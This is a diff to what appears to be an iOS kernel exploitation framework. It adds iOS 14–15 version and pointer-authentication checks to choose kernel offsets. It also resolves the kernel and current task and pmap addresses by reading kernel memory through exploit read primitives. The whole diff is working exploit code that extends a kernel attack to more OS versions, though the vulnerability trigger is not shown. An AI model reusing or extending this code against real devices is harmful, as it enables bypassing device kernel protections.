@@ -99,6 +99,34 @@ void info_init(struct kfd* kfd)
             return;
         }
     }
+    
+    if (@available(iOS 15.0, *)) {
+        if (@available(iOS 15.4, *)) {
+            kfd->info.env.vid = 6;
+        }
+        else if (@available(iOS 15.2, *)) {
+            kfd->info.env.vid = 4;
+        }
+        else {
+            kfd->info.env.vid = 2;
+        }
+        int ptrAuthVal = 0;
+        size_t len = sizeof(ptrAuthVal);
+        assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
+        // ^ This seems to fail on iOS 14, luckily there are no differences in offsets between arm64 and arm64e there
+        if (ptrAuthVal != 0) {
+            kfd->info.env.vid++;
+        }
+        return;
+    }
+    else if (@available(iOS 14.5, *)) {
+        kfd->info.env.vid = 1;
+        return;
+    }
+    else if (@available(iOS 14.0, *)) {
+        kfd->info.env.vid = 0;
+        return;
+    }
 
     assert_false("unsupported osversion");
 }
@@ -111,7 +139,12 @@ void info_run(struct kfd* kfd)
      * current_task()
      */
     assert(kfd->info.kaddr.current_proc);
-    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
+    if (dynamic_info(proc__task)) {
+        kfd->info.kaddr.current_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.current_proc));
+    }
+    else {
+        kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
+    }
     print_x64(kfd->info.kaddr.current_proc);
     print_x64(kfd->info.kaddr.current_task);
 
@@ -121,11 +154,11 @@ void info_run(struct kfd* kfd)
     u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
     kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
     print_x64(kfd->info.kaddr.current_map);
-
+    
     /*
      * current_pmap()
      */
-    u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.current_map);
+    u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.current_map);
     kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
     print_x64(kfd->info.kaddr.current_pmap);
 
@@ -133,7 +166,12 @@ void info_run(struct kfd* kfd)
         /*
          * kernel_task()
          */
-        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
+        if (dynamic_info(proc__task)) {
+            kfd->info.kaddr.kernel_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.kernel_proc));
+        }
+        else {
+            kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
+        }
         print_x64(kfd->info.kaddr.kernel_proc);
         print_x64(kfd->info.kaddr.kernel_task);
 
@@ -147,7 +185,7 @@ void info_run(struct kfd* kfd)
         /*
          * kernel_pmap()
          */
-        u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.kernel_map);
+        u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.kernel_map);
         kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
         print_x64(kfd->info.kaddr.kernel_pmap);
     }
